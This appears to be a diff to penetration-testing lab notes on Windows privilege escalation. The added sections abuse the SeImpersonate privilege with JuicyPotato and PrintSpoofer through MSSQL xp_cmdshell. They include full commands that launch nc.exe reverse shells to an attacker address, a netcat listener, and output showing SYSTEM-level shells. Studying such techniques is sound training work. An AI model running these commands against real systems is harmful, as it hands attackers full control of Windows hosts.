@@ -65,10 +65,56 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 * Privilege can be used to impersonate a privileged account such as NT AUTHORITY\SYSTEM
 * JuicyPotato can be used to exploit the SeImpersonate or SeAssignPrimaryToken privileges 
 
-## Escalating Privileges using JuicyPotato
+### Escalating Privileges using JuicyPotato
 * Download JuicyPotato.exe binary
 * Upload JuicyPotato.exe and nc.exe to the target server
 * Setup a netcat listener on port 8443 and execute the command below
 
 <pre>SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *</pre>
 
+`-l 53375` : Specifies the COM server listening port  
+`-p c:\windows\system32\cmd.exe` : Program to launch (cmd.exe)  
+`-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` : Arguments passed to `cmd.exe` > start `nc.exe` to create a reverse shell to local attacking machine on port 8443  
+`-t *` : Tells JuicyPotato to try both `CreateProcessWithToken` and `CreateProcessAsUser` functions
+
+### Catching SYSTEM Shell
+<pre>sudo nc -lnvp 8443</pre>
+
+<pre>C:\Windows\system32>whoami
+
+whoami
+nt authority\system
+
+
+C:\Windows\system32>hostname
+
+hostname
+WINLPE-SRV01</pre>
+
+## PrintSpoofer and RoguePotato
+* JuicyPotato does not work on Windows Server 2019 and Windows 10 build 1809 onwards
+* PrintSpoofer and RoguePotato can be used to gain the same privileges and `NT AUTHORITY\SYSTEM` level access
+
+https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
+
+### Escalating Privileges using PrintSpoofer
+* Use the tool to spawn a SYSTEM process in current console and interact with it
+* Connect with mssqlclient.py and use tool with the -c argument to execute
+* Use nc.exe to spawn a reverse shell
+* Netcat listener waiting on port 8443
+
+<pre>SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"</pre>
+
+### Catching Reverse Shell as SYSTEM
+<pre>nc -lnvp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+
+C:\Windows\system32>whoami
+
+whoami
+nt authority\system</pre>
